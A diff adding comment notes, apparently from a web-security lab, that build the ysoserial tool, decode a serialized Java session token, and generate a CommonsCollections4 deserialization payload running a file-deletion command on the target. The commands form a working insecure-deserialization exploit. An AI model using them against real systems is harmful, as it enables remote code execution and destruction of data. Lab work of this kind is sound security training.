@@ -1,0 +1,10 @@
+# git clone https://github.com/frohoff/ysoserial.git
+# cd ysoserial
+# mvn clean package -DskipTests
+# java -jar target/ysoserial-0.0.6-SNAPSHOT-all.jar
+#
+# To show the deserialized content:
+# urldecode $(echo -n 'rO0ABXNyACJkYXRhLnNlc3Npb24udG9rZW4uQWNjZXNzVG9rZW5Vc2Vyc1%2bhUBRJ0u8CAAJMAAthY2Nlc3NUb2tlbnQAEkxqYXZhL2xhbmcvU3RyaW5nO0wACHVzZXJuYW1lcQB%2bAAF4cHQAIGpsMWhpMWlnaDR2OWoyYm0yeTN1aXo0aDF2ZHlvenI4dAAGd2llbmVy')| base64 --decode | strings
+#
+# Attack:
+# urlencode $(java -jar target/ysoserial-0.0.6-SNAPSHOT-all.jar CommonsCollections4 'rm /home/carlos/morale.txt'|base64|tr -d '\n')
